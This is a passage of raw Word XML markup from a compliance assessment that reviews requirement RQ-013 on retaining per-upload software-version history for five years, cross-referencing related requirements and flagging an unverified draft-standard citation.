        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="594C0B10" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BBD48B3" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25C06A0B" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C7B391D" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D839E0E" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CBEC4DC" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30A0A9DA" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CBDFE46" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DA1DA9B" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59CA35DF" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30A7A373" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EBBEB5D" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03C2B137" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F3A66F5" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43F2F36D" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C4FAA14" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59652002" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CC70C83" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4567EA21" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60073C3B" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D917D13" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3523D859" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0278B875" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="195B1589" w14:textId="77777777" w:rsidR="00483B71" w:rsidRPr="00EB0F23" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="409062F5" w14:textId="5314A2CC" w:rsidR="00A366E1" w:rsidRDefault="00A366E1" w:rsidP="00A366E1">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C1714F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131D4452" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="247BF7DB" w14:textId="77777777" w:rsidR="00A366E1" w:rsidRDefault="00A366E1" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4877D62E" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-013 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386075E2" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-013 is the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software-version-per-upload retention</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement — the firmware-specific </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>specialisation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of RQ-012's general 5-year log. The recheck is boundary hygiene with its </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>neighbours</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, plus retention of the important </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>citation caution</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> I already flagged. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>Three</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>corrections</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67972A67" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Self-erasing install → cross-reference RQ-008; general-retention properties → cross-reference RQ-012.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> My original G-3 co-owned the install-reboot clearing (that is </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008 G-3</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), and the circular-buffer/cold-start-clearing properties are </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012's</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> general findings. RQ-013's </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unique</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> contribution is </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>version-upload-specific</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: (a) no per-upload </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>history</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and (b) no per-upload </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>timestamp</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve">I </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>scope</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>those</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>cross-reference</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>rest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D42A050" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">"Device witnesses every upload" nuance → keep, but attribute the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>event</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to RQ-008.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SysCom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> UPDATE_COMPLETED event (that the device </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>observes</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> an upload) is </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008's evidence surface</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; RQ-013 consumes it only to argue*"the raw material exists but is not retained as version history."*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700CF04E" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Citation caution retained and hardened.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>prEN</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 50742 §7.3.1</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> claim (that SW-version storage is </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>excluded</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the tracing log) I still </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot verify</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and — read literally — it would </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>weaken</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the gap. Kept as a**"to-be-confirmed" normative-interpretation question**, with the non-conformity resting on the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>verifiable device facts</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no history, no timestamp), not the draft clause.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6BD8F9" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097">
        <w:pict w14:anchorId="75BD1F00">
          <v:rect id="_x0000_i1878" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="336F8D04" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5981B402" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE39D99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 xml:space="preserve">EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §3</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>specialised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software-version upload history, 5 years per upload</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — a </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>per-event, long-term audit-retention</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement.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947"/>
        <w:gridCol w:w="1828"/>
        <w:gridCol w:w="4092"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="11CA1B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21CD80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D575F3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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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1ACBEF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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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0E75CD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Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="7F891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D07A4" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">CR 2.8 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>Auditable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>events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ADCC4" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA40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44244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 xml:space="preserve">Correct (an </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>upload</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> is the auditable event)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EF63B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 xml:space="preserve">The upload event itself is observed in RQ-008; here the question is </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>retaining it as version history</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="57CFA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A5BBE5" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">CR 2.9 – Audit </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>storage</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>capacity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613BD" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
